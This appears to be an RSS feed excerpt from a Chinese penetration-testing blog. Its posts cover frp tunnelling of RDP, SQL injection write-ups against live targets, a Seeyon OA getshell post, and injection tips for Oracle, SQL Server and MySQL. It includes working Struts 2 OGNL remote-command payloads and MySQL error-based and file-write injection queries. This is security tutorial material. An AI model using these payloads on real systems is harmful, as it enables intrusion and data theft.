&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">bind_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">➜ frp ./frps -c frps.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [service.go:139] frps tcp listen on 0.0.0.0:7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">2019/07/30 23:31:31 [I] [root.go:204] Start frps success&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>客户端&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\Administrator\Desktop\frp&amp;gt;type frpc.ini&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[common]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">66.123.35.123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">7000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">[rdp]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">local_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">3389&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">remote_port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">33389&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">; 加密压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_encryption&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">use_compression&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">true&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>C:\Users\Administrator\Desktop\frp&amp;gt;frpc.exe -c frpc.ini
2019/07/30 23:32:38 [I] [service.go:221] login to server success, get run id [ce
144f7511f63353], server udp port [0]
2019/07/30 23:32:38 [I] [proxy_manager.go:137] [ce144f7511f63353] proxy added: [
rdp]
2019/07/30 23:32:38 [I] [control.go:144] [rdp] start proxy success
&lt;/code>&lt;/pre>&lt;p>这里其实可以把 frp 做成服务，开机自启动的那种&lt;/p></description></item><item><title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title><link>https://wyb0.cn/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link><pubDate>Sat, 27 Jul 2019 18:15:25 +0000</pubDate><guid>https://wyb0.cn/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid><description>&lt;h3 id="0x00-先说前提">0x00 先说前提&lt;/h3>
&lt;p>昨天某个小伙伴说有个注入没法搞
&lt;img src="https://wyb0.cn/img/post/Xnip2019-07-27_19-20-07.png" alt="60">&lt;/p>
&lt;p>前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了
&lt;img src="https://wyb0.cn/img/post/Xnip2019-07-27_18-40-20.png" alt="">
&lt;img src="https://wyb0.cn/img/post/Xnip2019-07-27_18-41-18.png" alt="">&lt;/p></description></item><item><title>利用 Python 的协程进行快速端口扫描</title><link>https://wyb0.cn/posts/2019/python-coroutine-fast-port-scan/</link><pubDate>Thu, 04 Jul 2019 18:09:49 +0000</pubDate><guid>https://wyb0.cn/posts/2019/python-coroutine-fast-port-scan/</guid><description>&lt;h3 id="0x00-协程的优势">0x00 协程的优势&lt;/h3>
&lt;p>协程拥有极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此没有线程切换的开销。和多线程比，线程数量越多，协程的性能优势就越明显。&lt;/p></description></item><item><title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title><link>https://wyb0.cn/posts/2019/seeyon-htmlofficeservlet-getshell/</link><pubDate>Sat, 29 Jun 2019 17:57:32 +0000</pubDate><guid>https://wyb0.cn/posts/2019/seeyon-htmlofficeservlet-getshell/</guid><description>&lt;h3 id="0x00-影响版本">0x00 影响版本&lt;/h3>
&lt;ul>
&lt;li>致远A8-V5协同管理软件 V6.1sp1&lt;/li>
&lt;li>致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3&lt;/li>
&lt;li>致远A8+协同管理软件 V7.1&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-查看接口看是否存在漏洞">0x01 查看接口看是否存在漏洞&lt;/h3>
&lt;p>如果查看 &lt;code>&amp;quot;seeyon/htmlofficeservlet&amp;quot;&lt;/code> 接口，出现如下内容则表示存在漏洞
&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-29_09-43-32.png" alt="70">&lt;/p></description></item><item><title>从 SQL Server 注入到 远程连接桌面</title><link>https://wyb0.cn/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link><pubDate>Tue, 25 Jun 2019 17:01:53 +0000</pubDate><guid>https://wyb0.cn/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>只有一个登录框&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>简单看了下登陆框，可以爆破用户名&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-25_09-42-33.png" alt="50">
&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-25_09-43-33.png" alt="50">&lt;/p>
&lt;p>加单引号后报错，试了试 and 1=1 确实存在注入&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-25_09-45-03.png" alt="60">
&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-25_09-46-06.png" alt="50">&lt;/p>
&lt;h3 id="0x01-进一步测试">0x01 进一步测试&lt;/h3>
&lt;p>尝试得到数据版本: &lt;code>admin' and @@version=1--&lt;/code>
&lt;img src="https://wyb0.cn/img/post/Xnip2019-06-25_09-49-45.png" alt="60">&lt;/p></description></item><item><title>从 SQL Server 注入到 getshell</title><link>https://wyb0.cn/posts/2019/sql-server-from-injection-to-getshell/</link><pubDate>Sat, 02 Mar 2019 20:23:35 +0000</pubDate><guid>https://wyb0.cn/posts/2019/sql-server-from-injection-to-getshell/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令&lt;/li>
&lt;li>扫描了全端口，没有发现什么有用的信息&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用&lt;/p></description></item><item><title>SQL注入 tips(Oracle)</title><link>https://wyb0.cn/posts/2019/injection-tips-of-oracle/</link><pubDate>Fri, 04 Jan 2019 20:23:35 +0000</pubDate><guid>https://wyb0.cn/posts/2019/injection-tips-of-oracle/</guid><description>&lt;h3 id="0x00-判断数据库类型">0x00 判断数据库类型&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Oracle有一些自带的表：dual、user_tables&lt;/p>
&lt;ul>
&lt;li>&lt;code>id=45 and (select count(*) from user_tables)&amp;gt;0--&lt;/code>&lt;/li>
&lt;li>&lt;code>id=45 and (select count(*) from dual)&amp;gt;0--&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>利用自带的一些函数：譬如utl_http.request 这些&lt;/p></description></item><item><title>Oracle 数据库简单使用</title><link>https://wyb0.cn/posts/2018/oracle-database/</link><pubDate>Tue, 25 Dec 2018 23:34:56 +0000</pubDate><guid>https://wyb0.cn/posts/2018/oracle-database/</guid><description>&lt;h3 id="0x00-关于oracle">0x00 关于Oracle&lt;/h3>
&lt;ul>
&lt;li>完整的Oracle数据库通常由两部分组成：Oracle数据库和数据库实例。&lt;/li>
&lt;li>数据库是一系列物理文件的集合（数据文件，控制文件，联机日志，参数文件等）&lt;/li>
&lt;li>Oracle数据库实例则是一组Oracle后台进程/线程以及在服务器分配的共享内存区&lt;/li>
&lt;li>关于部分视图
&lt;ul>
&lt;li>&lt;code>DBA/ALL/USER/V_$/GV_$/SESSION/INDEX&lt;/code>开头的绝大部分都是视图&lt;/li>
&lt;li>DBA_TABLES意为DBA拥有的或可以访问的所有的关系表。&lt;/li>
&lt;li>ALL_TABLES意为某一用户拥有的或有权限访问的所有的关系表。&lt;/li>
&lt;li>USER_TABLES意为某一用户所拥有的所有的关系表。&lt;/li>
&lt;li>当某一用户本身就为数据库DBA时，DBA_TABLES与ALL_TABLES等价。&lt;/li>
&lt;li>&lt;code>DBA_TABLES &amp;gt;= ALL_TABLES &amp;gt;= USER_TABLES&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-关于实例">0x01 关于实例&lt;/h3>
&lt;ul>
&lt;li>在启动Oracle数据库服务器时，实际上是在服务器的内存中创建一个Oracle实例（即在服务器内存中分配共享内存并创建相关的后台内存）&lt;/li>
&lt;li>我们访问Oracle都是访问一个实例，通过Oracle数据库实例来访问和控制磁盘中的数据文件&lt;/li>
&lt;li>Oracle实例如果关联了数据库文件，就是可以访问的，如果没有，就会得到实例不可用的错误&lt;/li>
&lt;li>实例名指的是用于响应某个数据库操作的数据库管理系统的名称，它同时也叫SID，连接数据库时就会用到这个SID，如：jdbc:oracle:thin:@localhost:1521:orcl（orcl就为数据库实例名）&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-关于表空间可以理解为mysql中的数据库">0x02 关于表空间(可以理解为mysql中的数据库)&lt;/h3>
&lt;ul>
&lt;li>Oracle数据库是通过表空间来存储物理表的，一个数据库实例可以有N个表空间，一个表空间下可以有N张表。&lt;/li>
&lt;li>用户和表空间是多对多的关系，但是一般创建用户时会指定一个默认表空间。&lt;/li>
&lt;li>表空间是数据库中最大的逻辑单位，一个表空间可以包含多个数据文件，而一个数据文件只能隶属一个表空间。&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-搭建oracle环境">0x03 搭建Oracle环境&lt;/h3>
&lt;p>使用docker拉取Oracle数据库并且运行&lt;/p></description></item><item><title>记一次 SQL Server 报错注入</title><link>https://wyb0.cn/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link><pubDate>Mon, 24 Dec 2018 10:51:02 +0000</pubDate><guid>https://wyb0.cn/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid><description>&lt;h3 id="0x00-验证码前端验证">0x00 验证码前端验证&lt;/h3>
&lt;p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
&lt;img src="https://wyb0.cn/img/post/20181224-200518.png" alt="40">&lt;/p></description></item><item><title>使用 docker-compose 构造 LAMP 环境</title><link>https://wyb0.cn/posts/2018/docker-compose-build-lamp/</link><pubDate>Sat, 15 Dec 2018 22:51:04 +0000</pubDate><guid>https://wyb0.cn/posts/2018/docker-compose-build-lamp/</guid><description>&lt;h3 id="0x00-实现功能">0x00 实现功能&lt;/h3>
&lt;p>使用docker-compose构造LAMP环境，其中mysql数据库、mysql配置文件、网站文件均持久化存储到本机。&lt;/p></description></item><item><title>Docker Compose</title><link>https://wyb0.cn/posts/2018/docker-compose/</link><pubDate>Mon, 19 Nov 2018 20:10:23 +0000</pubDate><guid>https://wyb0.cn/posts/2018/docker-compose/</guid><description>&lt;h3 id="0x00-关于docker-compose">0x00 关于docker compose&lt;/h3>
&lt;p>可以把docker-compose当作docker命令的封装，它是一个用来把 docker 自动化的东西，docker-compose可以一次性管理多个容器，通常用于需要多个容器相互配合来完成某项任务的场景。&lt;/p></description></item><item><title>内网渗透之 Responder 与 Net-NTLM hash</title><link>https://wyb0.cn/posts/2018/responder-and-ntlm-hash/</link><pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate><guid>https://wyb0.cn/posts/2018/responder-and-ntlm-hash/</guid><description>&lt;h3 id="0x00-一些概念">0x00 一些概念&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Windows 认证协议&lt;/p>
&lt;p>分为：基于 NTLM 的认证和基于 kerberos 的认证&lt;/p>
&lt;/li>
&lt;li>
&lt;p>什么是 NTLM Hash？&lt;/p>
&lt;p>早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash&lt;/p></description></item><item><title>SQL注入 tips(SQL Server)</title><link>https://wyb0.cn/posts/2018/injection-tips-of-sqlserver/</link><pubDate>Tue, 04 Sep 2018 10:09:17 +0000</pubDate><guid>https://wyb0.cn/posts/2018/injection-tips-of-sqlserver/</guid><description>&lt;h3 id="0x00-基础信息探测">0x00 基础信息探测&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@@&lt;/span>&lt;span style="color:#66d9ef">VERSION&lt;/span>,&lt;span style="color:#f92672">@@&lt;/span>SERVERNAME,&lt;span style="color:#f92672">@@&lt;/span>SERVICENAME;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--WIN-2008
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--MSSQLSERVER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">USER&lt;/span>,&lt;span style="color:#66d9ef">CURRENT_USER&lt;/span>,&lt;span style="color:#66d9ef">SESSION_USER&lt;/span>,&lt;span style="color:#66d9ef">SYSTEM_USER&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--wyb
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--46530
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_ID(),USER_SID();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--&amp;lt;01&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ORIGINAL_LOGIN();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-union-query--error-based-注入">0x01 UNION query &amp;amp; error-based 注入&lt;/h3>
&lt;ul>
&lt;li>判断存在注入&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>and 1=1/and 1=2
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>判断是否为sa权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> name &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">convert&lt;/span>(int,(&lt;span style="color:#66d9ef">select&lt;/span> is_srvrolemember(&lt;span style="color:#e6db74">&amp;#39;sysadmin&amp;#39;&lt;/span>)));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.cn/img/post/20180904-105516.png" alt="55">&lt;/p></description></item><item><title>关于 PHP SESSION 反序列化</title><link>https://wyb0.cn/posts/2018/php-session-deserialize/</link><pubDate>Mon, 23 Jul 2018 00:09:17 +0000</pubDate><guid>https://wyb0.cn/posts/2018/php-session-deserialize/</guid><description>&lt;h3 id="0x00-环境">0x00 环境&lt;/h3>
&lt;p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。&lt;/p>
&lt;p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题&lt;/p></description></item><item><title>Struts 2 相关漏洞 payload</title><link>https://wyb0.cn/posts/2018/structs2-some-vulnerability-payload/</link><pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate><guid>https://wyb0.cn/posts/2018/structs2-some-vulnerability-payload/</guid><description>&lt;h3 id="0x00-s2-001">0x00 S2-001&lt;/h3>
&lt;pre tabindex="0">&lt;code>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;#34;whoami&amp;#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
&lt;/code>&lt;/pre>&lt;h3 id="0x01-s2-005">0x01 S2-005&lt;/h3>
&lt;p>影响版本: 2.0.0 - 2.1.8.1&lt;/p>
&lt;pre tabindex="0">&lt;code>http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&amp;#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&amp;#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
&lt;/code>&lt;/pre>&lt;h3 id="0x02-s2-007">0x02 S2-007&lt;/h3>
&lt;p>影响版本: 2.0.0 - 2.2.3&lt;/p>
&lt;pre tabindex="0">&lt;code>当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;#39; + (#_memberAccess[&amp;#34;allowStaticMethodAccess&amp;#34;]=true,#foo=new java.lang.Boolean(&amp;#34;false&amp;#34;) ,#context[&amp;#34;xwork.MethodAccessor.denyMethodExecution&amp;#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&amp;#39;id&amp;#39;).getInputStream())) + &amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x03-s2-012">0x03 S2-012&lt;/h3>
&lt;p>影响版本: 2.1.0 - 2.3.13&lt;/p></description></item><item><title>SQL注入 tips(MySQL)</title><link>https://wyb0.cn/posts/2018/injection-tips-of-mysql/</link><pubDate>Wed, 23 May 2018 11:14:51 +0000</pubDate><guid>https://wyb0.cn/posts/2018/injection-tips-of-mysql/</guid><description>&lt;p>环境：MySQL 5.5.47&lt;/p>
&lt;h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面&lt;/h3>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &amp;#39;C:\\Apps\\phpStudy\\WWW\\a.txt&amp;#39;;
Query OK, 1 row affected (0.01 sec)
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~msg~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~rtest~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2));
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=2,1,(select 1 union select 2));
ERROR 1242 (21000): Subquery returns more than 1 row

mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;gt;1) then 1 else 1*(select 1 union select 2)end)=1;
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;lt;1) then 1 else 1*(select 1 union select 2)end)=1;
ERROR 1242 (21000): Subquery returns more than 1 row
&lt;/code>&lt;/pre>&lt;h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面&lt;/h3>
&lt;ul>
&lt;li>limit前面没有order by可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 union select 1,2,3;
+----+------+---------+
| id | name | content |
+----+------+---------+
| 1 | 2 | 3 |
+----+------+---------+
1 row in set (0.01 sec)

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse();
+-------------------+---------------+---------------+------------+------------+
| Field_name | Min_value | Max_value | Min_length | Max_length |
+-------------------+---------------+---------------+------------+------------+
| rtest.msg.name | xiaohong | xiaohong | 8 | 8 |
| rtest.msg.content | I have a cat. | I have a cat. | 13 | 13 |
+-------------------+---------------+---------------+------------+------------+

------------------+-------+-------------------------+------+--------------------+
 Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std | Optimal_fieldtype |
------------------+-------+-------------------------+------+--------------------+
 0 | 0 | 8.0000 | NULL | ENUM(&amp;#39;xiaohong&amp;#39;) NOT NULL |
 0 | 0 | 13.0000 | NULL | ENUM(&amp;#39;I have a cat.&amp;#39;) NOT NULL|
------------------+-------+-------------------------+------+--------------------+
2 rows in set (0.00 sec)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>limit前面有order by则不可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x02-根据报错得到数据库名表名列名">0x02 根据报错得到数据库名、表名、列名&lt;/h3>
&lt;pre tabindex="0">&lt;code>#得到数据库名为rtest
mysql&amp;gt; select id,name,content from msg where id=2-a();
ERROR 1305 (42000): FUNCTION rtest.a does not exist

#得到表名为msg
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(1);
ERROR 1367 (22007): Illegal non geometric &amp;#39;1&amp;#39; value found during parsing
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(id);
ERROR 1367 (22007): Illegal non geometric &amp;#39;`rtest`.`msg`.`id`&amp;#39; value found during parsing

#得到列名为id、name、content、useragent
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;id&amp;#39;
